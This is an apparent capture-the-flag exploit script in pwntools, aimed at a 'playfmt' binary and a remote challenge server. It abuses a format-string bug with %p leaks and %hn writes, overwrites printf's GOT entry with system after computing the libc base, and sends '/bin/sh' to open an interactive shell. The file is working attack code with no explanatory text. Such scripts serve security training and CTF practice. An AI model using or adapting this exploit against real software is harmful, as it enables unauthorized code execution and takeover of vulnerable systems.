from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv
from subprocess import check_output

s = lambda data: p.send(str(data))
sa = lambda delim,data: p.sendafter(delim,str(data))
sl = lambda data: p.sendline(str(data))
sla = lambda delim,data: p.sendlineafter(delim,str(data))
r = lambda num=4096: p.recv(num)
ru = lambda delims,drop=True: p.recvuntil(delims,drop)
uu64 = lambda data: u64(data.ljust(8,'\0'))
leak = lambda name,addr: log.success('{} = {:#x}'.format(name, addr))

def leak_libc(func,addr,elf=None):
	if elf:
		libc = elf
		base = addr-libc.sym[func]
		leak('base',base)
		system = base+libc.sym['system']
	else:
		libc = LibcSearcher(func,addr)
		base = addr-libc.dump(func)
		leak('base',base)
		system = base+libc.dump('system')

	return (base,libc,system)

context.log_level = 'DEBUG'
binary = './LAB/lab9/playfmt'
context.binary = binary
elf = ELF(binary,checksec=False)
libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
#libc_path = './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'
#env={'LD_PRELOAD':libc_path}
libc = ELF(libc_path,checksec=False)
one = map(int, check_output(['one_gadget','--raw',libc_path]).split(' '))
p = remote('node3.buuoj.cn',20000) if argv[1]=='r' else process(binary)

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,2,3,4
def add(size,content='a'):
	sla(':',_add)
	sla(':',size)
	sa(':',content)

def free(index):
	sla(':',_free)
	sla(':',index)

def edit(index,content):
	sla(':',_edit)
	sla(':',index)
	sa(':',content)

def show(index):
	sla(':',_show)
	sla(':',index)

# start
hn = lambda addr,offset: '%{}c%{}$hn'.format(addr,offset)

def delay():
	while True:
		sl('delay')
		sleep(0.2)
		data = r()
		if data.find('delay') != -1:
			break

for i in range(3):
	ru('\n')
sl('%6$p')
ebp2 = int(ru('\n'),16)
ebp = ebp2-0x10
s7 = ebp2-0xc
s11 = ebp2+4
mask = 0xffff
printf = elf.got['printf']

sl(hn(s7&mask,6))
sl(hn(printf&mask,10))
delay()
sl(hn(s11&mask,6))
sl(hn((printf+2)&mask,10))
delay()

sl('aaaa%7$s')
ru('aaaa')
printf = u32(r(4))
leak('printf',printf)
base,libc,system = leak_libc('printf',printf)

sl(hn(system&mask,7)+hn((system>>16)-(system&mask),11))
delay()

sl('/bin/sh\x00')
# end

p.interactive()